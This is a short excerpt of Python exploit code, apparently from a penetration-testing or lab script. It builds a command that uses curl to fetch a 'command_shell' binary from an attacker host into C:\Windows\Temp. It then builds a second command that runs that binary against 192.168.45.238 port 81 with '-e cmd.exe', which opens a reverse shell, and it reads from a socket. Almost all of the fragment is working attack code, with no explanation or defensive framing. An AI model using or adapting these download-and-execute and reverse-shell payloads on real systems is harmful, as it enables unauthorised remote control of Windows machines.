...
download_string= f"curl http://{lhost}:80/{command_shell} -o c:\Windows\Temp\{command_shell}".encode('utf-8')
...
run2 = s.recv(54) 
sleep(0.8)
shell_string= f"c:\Windows\Temp\{command_shell} 192.168.45.238 81 -e cmd.exe".encode('utf-8')
